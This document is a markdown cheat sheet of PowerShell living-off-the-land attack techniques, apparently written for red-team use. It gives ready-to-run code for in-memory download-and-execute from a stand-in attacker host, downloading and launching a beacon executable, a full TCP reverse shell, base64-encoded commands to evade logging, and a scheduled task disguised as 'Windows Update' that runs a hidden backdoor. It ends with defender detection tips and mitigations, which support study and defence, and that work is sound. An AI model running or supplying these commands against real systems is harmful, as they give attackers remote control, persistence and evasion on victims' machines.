# 🧰 PowerShell - Living Off the Land

**PowerShell** is one of the most commonly abused tools in Windows environments. It is powerful, scriptable, built-in, and trusted — which makes it a perfect weapon in a red team or attacker’s toolkit.

> ⚠️ PowerShell is legitimate admin software. Abuse of it must be done in lab environments only.

---

## 🛠️ What It Does
PowerShell can:
- Execute remote scripts
- Run .NET assemblies in memory
- Download + execute payloads without touching disk
- Create persistence mechanisms
- Modify system settings silently

---

## 💣 Common LotL PowerShell Techniques

### 1. In-Memory Script Execution
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```
✅ Runs remote code in memory without writing to disk

---

### 2. Encoded Command to Evade Logging
```powershell
powershell.exe -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAI...==
```
✅ Obfuscates intent from command-line logs (can be base64 of full script)

---

### 3. Download and Execute Payload
```powershell
Invoke-WebRequest -Uri http://attacker.com/beacon.exe -OutFile beacon.exe
Start-Process beacon.exe
```
✅ Uses PowerShell’s downloader + runner in one go

---

### 4. Reverse Shell Over HTTP
```powershell
$client = New-Object System.Net.Sockets.TCPClient('attacker-ip', 443)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
$client.Close()
```
✅ Establishes full control of victim system from remote server

---

### 5. Add Persistence via Scheduled Task
```powershell
schtasks /create /tn "Windows Update" /tr "powershell.exe -WindowStyle Hidden -File C:\Users\Public\backdoor.ps1" /sc minute /mo 30
```
✅ Ensures payload runs every 30 minutes

---

## 🛡️ Defender Notes
| Detection Tip | How to Catch It |
|---------------|-----------------|
| PowerShell command-line logging | Enable script block logging (Event ID 4104) |
| Parent/child analysis | Watch for Office or Explorer launching PowerShell |
| Base64 abuse | Flag `-EncodedCommand` args and log decoding attempts |
| Network beacons | Monitor outbound HTTP/TCP traffic from PowerShell.exe |

---

## 🧼 Mitigation Tactics
- Enable **Constrained Language Mode**
- Use **PowerShell v5+ logging features**
- Apply **AppLocker or WDAC** to restrict script execution
- Monitor for abnormal parent-child process trees

---

> 🔍 Check this file in labs or simulations only. Never execute these examples on production systems.
